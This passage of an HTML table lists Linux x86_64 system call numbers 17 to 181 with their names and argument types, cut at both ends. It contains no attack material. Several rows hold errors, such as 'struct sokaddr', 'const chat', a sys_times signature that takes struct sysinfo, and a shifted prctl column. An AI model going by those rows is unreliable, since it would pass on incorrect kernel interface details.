align="left">char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">18</td><td align="left">sys_pwrite64</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">19</td><td align="left">sys_readv</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">20</td><td align="left">sys_writev</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">21</td><td align="left">sys_access</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">22</td><td align="left">sys_pipe</td><td align="left">int *filedes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">23</td><td align="left">sys_select</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set*exp</td><td align="left">struct timeval *tvp</td><td align="left"></td></tr><tr><td align="left">24</td><td align="left">sys_sched_yield</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">25</td><td align="left">sys_mremap</td><td align="left">unsigned long addr</td><td align="left">unsigned long old_len</td><td align="left">unsigned long new_len</td><td align="left">unsigned long flags</td><td align="left">unsigned long new_addr</td><td align="left"></td></tr><tr><td align="left">26</td><td align="left">sys_msync</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">27</td><td align="left">sys_mincore</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned char *vec</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">28</td><td align="left">sys_madvise</td><td align="left">unsigned long start</td><td align="left">size_t len_in</td><td align="left">int behavior</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">29</td><td align="left">sys_shmget</td><td align="left">key_t key</td><td align="left">size_t size</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">30</td><td align="left">sys_shmat</td><td align="left">int shmid</td><td align="left">char *shmaddr</td><td align="left">int shmflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">31</td><td align="left">sys_shmctl</td><td align="left">int shmid</td><td align="left">int cmd</td><td align="left">struct shmid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">32</td><td align="left">sys_dup</td><td align="left">unsigned int fildes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">33</td><td align="left">sys_dup2</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">34</td><td align="left">sys_pause</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">35</td><td align="left">sys_nanosleep</td><td align="left">struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">36</td><td align="left">sys_getitimer</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">37</td><td align="left">sys_alarm</td><td align="left">unsigned int seconds</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">38</td><td align="left">sys_setitimer</td><td align="left">int which</td><td align="left">struct itimerval *value</td><td align="left">struct itimerval *ovalue</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">39</td><td align="left">sys_getpid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">40</td><td align="left">sys_sendfile</td><td align="left">int out_fd</td><td align="left">int in_fd</td><td align="left">off_t *offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">41</td><td align="left">sys_socket</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">42</td><td align="left">sys_connect</td><td align="left">int fd</td><td align="left">struct sockaddr *uservaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">43</td><td align="left">sys_accept</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">44</td><td align="left">sys_sendto</td><td align="left">int fd</td><td align="left">void *buff</td><td align="left">size_t len</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int addr_len</td></tr><tr><td align="left">45</td><td align="left">sys_recvfrom</td><td align="left">int fd</td><td align="left">void *ubuf</td><td align="left">size_t size</td><td align="left">unsigned flags</td><td align="left">struct sockaddr *addr</td><td align="left">int *addr_len</td></tr><tr><td align="left">46</td><td align="left">sys_sendmsg</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">47</td><td align="left">sys_recvmsg</td><td align="left">int fd</td><td align="left">struct msghdr *msg</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">48</td><td align="left">sys_shutdown</td><td align="left">int fd</td><td align="left">int how</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">49</td><td align="left">sys_bind</td><td align="left">int fd</td><td align="left">struct sokaddr *umyaddr</td><td align="left">int addrlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">50</td><td align="left">sys_listen</td><td align="left">int fd</td><td align="left">int backlog</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">51</td><td align="left">sys_getsockname</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">52</td><td align="left">sys_getpeername</td><td align="left">int fd</td><td align="left">struct sockaddr *usockaddr</td><td align="left">int *usockaddr_len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">53</td><td align="left">sys_socketpair</td><td align="left">int family</td><td align="left">int type</td><td align="left">int protocol</td><td align="left">int *usockvec</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">54</td><td align="left">sys_setsockopt</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int optlen</td><td align="left"></td></tr><tr><td align="left">55</td><td align="left">sys_getsockopt</td><td align="left">int fd</td><td align="left">int level</td><td align="left">int optname</td><td align="left">char *optval</td><td align="left">int *optlen</td><td align="left"></td></tr><tr><td align="left">56</td><td align="left">sys_clone</td><td align="left">unsigned long clone_flags</td><td align="left">unsigned long newsp</td><td align="left">void *parent_tid</td><td align="left">void *child_tid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">57</td><td align="left">sys_fork</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">58</td><td align="left">sys_vfork</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">59</td><td align="left">sys_execve</td><td align="left">const char *filename</td><td align="left">const char *const argv[]</td><td align="left">const char *const envp[]</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">60</td><td align="left">sys_exit</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">61</td><td align="left">sys_wait4</td><td align="left">pid_t upid</td><td align="left">int *stat_addr</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">62</td><td align="left">sys_kill</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">63</td><td align="left">sys_uname</td><td align="left">struct old_utsname *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">64</td><td align="left">sys_semget</td><td align="left">key_t key</td><td align="left">int nsems</td><td align="left">int semflg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">65</td><td align="left">sys_semop</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">66</td><td align="left">sys_semctl</td><td align="left">int semid</td><td align="left">int semnum</td><td align="left">int cmd</td><td align="left">union semun arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">67</td><td align="left">sys_shmdt</td><td align="left">char *shmaddr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">68</td><td align="left">sys_msgget</td><td align="left">key_t key</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">69</td><td align="left">sys_msgsnd</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">int msgflg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">70</td><td align="left">sys_msgrcv</td><td align="left">int msqid</td><td align="left">struct msgbuf *msgp</td><td align="left">size_t msgsz</td><td align="left">long msgtyp</td><td align="left">int msgflg</td><td align="left"></td></tr><tr><td align="left">71</td><td align="left">sys_msgctl</td><td align="left">int msqid</td><td align="left">int cmd</td><td align="left">struct msqid_ds *buf</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">72</td><td align="left">sys_fcntl</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">73</td><td align="left">sys_flock</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">74</td><td align="left">sys_fsync</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">75</td><td align="left">sys_fdatasync</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">76</td><td align="left">sys_truncate</td><td align="left">const char *path</td><td align="left">long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">77</td><td align="left">sys_ftruncate</td><td align="left">unsigned int fd</td><td align="left">unsigned long length</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">78</td><td align="left">sys_getdents</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">79</td><td align="left">sys_getcwd</td><td align="left">char *buf</td><td align="left">unsigned long size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">80</td><td align="left">sys_chdir</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">81</td><td align="left">sys_fchdir</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">82</td><td align="left">sys_rename</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">83</td><td align="left">sys_mkdir</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">84</td><td align="left">sys_rmdir</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">85</td><td align="left">sys_creat</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">86</td><td align="left">sys_link</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">87</td><td align="left">sys_unlink</td><td align="left">const char *pathname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">88</td><td align="left">sys_symlink</td><td align="left">const char *oldname</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">89</td><td align="left">sys_readlink</td><td align="left">const char *path</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">90</td><td align="left">sys_chmod</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">91</td><td align="left">sys_fchmod</td><td align="left">unsigned int fd</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">92</td><td align="left">sys_chown</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">93</td><td align="left">sys_fchown</td><td align="left">unsigned int fd</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">94</td><td align="left">sys_lchown</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">95</td><td align="left">sys_umask</td><td align="left">int mask</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">96</td><td align="left">sys_gettimeofday</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">97</td><td align="left">sys_getrlimit</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">98</td><td align="left">sys_getrusage</td><td align="left">int who</td><td align="left">struct rusage *ru</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">99</td><td align="left">sys_sysinfo</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">100</td><td align="left">sys_times</td><td align="left">struct sysinfo *info</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">101</td><td align="left">sys_ptrace</td><td align="left">long request</td><td align="left">long pid</td><td align="left">unsigned long addr</td><td align="left">unsigned long data</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">102</td><td align="left">sys_getuid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">103</td><td align="left">sys_syslog</td><td align="left">int type</td><td align="left">char *buf</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">104</td><td align="left">sys_getgid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">105</td><td align="left">sys_setuid</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">106</td><td align="left">sys_setgid</td><td align="left">gid_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">107</td><td align="left">sys_geteuid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">108</td><td align="left">sys_getegid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">109</td><td align="left">sys_setpgid</td><td align="left">pid_t pid</td><td align="left">pid_t pgid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">110</td><td align="left">sys_getppid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">111</td><td align="left">sys_getpgrp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">112</td><td align="left">sys_setsid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">113</td><td align="left">sys_setreuid</td><td align="left">uid_t ruid</td><td align="left">uid_t euid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">114</td><td align="left">sys_setregid</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">115</td><td align="left">sys_getgroups</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">116</td><td align="left">sys_setgroups</td><td align="left">int gidsetsize</td><td align="left">gid_t *grouplist</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">117</td><td align="left">sys_setresuid</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">118</td><td align="left">sys_getresuid</td><td align="left">uid_t *ruid</td><td align="left">uid_t *euid</td><td align="left">uid_t *suid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">119</td><td align="left">sys_setresgid</td><td align="left">gid_t rgid</td><td align="left">gid_t egid</td><td align="left">gid_t sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">120</td><td align="left">sys_getresgid</td><td align="left">gid_t *rgid</td><td align="left">gid_t *egid</td><td align="left">gid_t *sgid</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">121</td><td align="left">sys_getpgid</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">122</td><td align="left">sys_setfsuid</td><td align="left">uid_t uid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">123</td><td align="left">sys_setfsgid</td><td align="left">gid_t gid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">124</td><td align="left">sys_getsid</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">125</td><td align="left">sys_capget</td><td align="left">cap_user_header_t header</td><td align="left">cap_user_data_t dataptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">126</td><td align="left">sys_capset</td><td align="left">cap_user_header_t header</td><td align="left">const cap_user_data_t data</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">127</td><td align="left">sys_rt_sigpending</td><td align="left">sigset_t *set</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">128</td><td align="left">sys_rt_sigtimedwait</td><td align="left">const sigset_t *uthese</td><td align="left">siginfo_t *uinfo</td><td align="left">const struct timespec *uts</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">129</td><td align="left">sys_rt_sigqueueinfo</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">130</td><td align="left">sys_rt_sigsuspend</td><td align="left">sigset_t *unewset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">131</td><td align="left">sys_sigaltstack</td><td align="left">const stack_t *uss</td><td align="left">stack_t *uoss</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">132</td><td align="left">sys_utime</td><td align="left">char *filename</td><td align="left">struct utimbuf *times</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">133</td><td align="left">sys_mknod</td><td align="left">const char *filename</td><td align="left">umode_t mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">134</td><td align="left">sys_uselib</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">135</td><td align="left">sys_personality</td><td align="left">unsigned int personality</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">136</td><td align="left">sys_ustat</td><td align="left">unsigned dev</td><td align="left">struct ustat *ubuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">137</td><td align="left">sys_statfs</td><td align="left">const char *pathname</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">138</td><td align="left">sys_fstatfs</td><td align="left">unsigned int fd</td><td align="left">struct statfs *buf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">139</td><td align="left">sys_sysfs</td><td align="left">int option</td><td align="left">unsigned long arg1</td><td align="left">unsigned long arg2</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">140</td><td align="left">sys_getpriority</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">141</td><td align="left">sys_setpriority</td><td align="left">int which</td><td align="left">int who</td><td align="left">int niceval</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">142</td><td align="left">sys_sched_setparam</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">143</td><td align="left">sys_sched_getparam</td><td align="left">pid_t pid</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">144</td><td align="left">sys_sched_setscheduler</td><td align="left">pid_t pid</td><td align="left">int policy</td><td align="left">struct sched_param *param</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">145</td><td align="left">sys_sched_getscheduler</td><td align="left">pid_t pid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">146</td><td align="left">sys_sched_get_priority_max</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">147</td><td align="left">sys_sched_get_priority_min</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">148</td><td align="left">sys_sched_rr_get_interval</td><td align="left">pid_t pid</td><td align="left">struct timespec *interval</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">149</td><td align="left">sys_mlock</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">150</td><td align="left">sys_munlock</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">151</td><td align="left">sys_mlockall</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">152</td><td align="left">sys_munlockall</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">153</td><td align="left">sys_vhangup</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">154</td><td align="left">sys_modify_ldt</td><td align="left">int func</td><td align="left">void *ptr</td><td align="left">unsigned long bytecount</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">155</td><td align="left">sys_pivot_root</td><td align="left">const char *new_root</td><td align="left">const char *put_old</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">156</td><td align="left">sys__sysctl</td><td align="left">struct __sysctl_args *args</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">157</td><td align="left">sys_prctl</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left"></td><td align="left">unsigned long arg5</td></tr><tr><td align="left">158</td><td align="left">sys_arch_prctl</td><td align="left">struct task_struct *task</td><td align="left">int code</td><td align="left">unsigned long *addr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">159</td><td align="left">sys_adjtimex</td><td align="left">struct timex *txc_p</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">160</td><td align="left">sys_setrlimit</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">161</td><td align="left">sys_chroot</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">162</td><td align="left">sys_sync</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">163</td><td align="left">sys_acct</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">164</td><td align="left">sys_settimeofday</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">165</td><td align="left">sys_mount</td><td align="left">char *dev_name</td><td align="left">char *dir_name</td><td align="left">char *type</td><td align="left">unsigned long flags</td><td align="left">void *data</td><td align="left"></td></tr><tr><td align="left">166</td><td align="left">sys_umount2</td><td align="left">const char *target</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">167</td><td align="left">sys_swapon</td><td align="left">const char *specialfile</td><td align="left">int swap_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">168</td><td align="left">sys_swapoff</td><td align="left">const char *specialfile</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">169</td><td align="left">sys_reboot</td><td align="left">int magic1</td><td align="left">int magic2</td><td align="left">unsigned int cmd</td><td align="left">void *arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">170</td><td align="left">sys_sethostname</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">171</td><td align="left">sys_setdomainname</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">172</td><td align="left">sys_iopl</td><td align="left">unsigned int level</td><td align="left">struct pt_regs *regs</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">173</td><td align="left">sys_ioperm</td><td align="left">unsigned long from</td><td align="left">unsigned long num</td><td align="left">int turn_on</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">174</td><td align="left">sys_create_module</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">175</td><td align="left">sys_init_module</td><td align="left">void *umod</td><td align="left">unsigned long len</td><td align="left">const char *uargs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">176</td><td align="left">sys_delete_module</td><td align="left">const chat *name_user</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">177</td><td align="left">sys_get_kernel_syms</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">178</td><td align="left">sys_query_module</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">179</td><td align="left">sys_quotactl</td><td align="left">unsigned int cmd</td><td align="left">const char *special</td><td align="left">qid_t id</td><td align="left">void *addr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">180</td><td align="left">sys_nfsservctl</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">181</td><td align="left">sys_getpmsg</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td 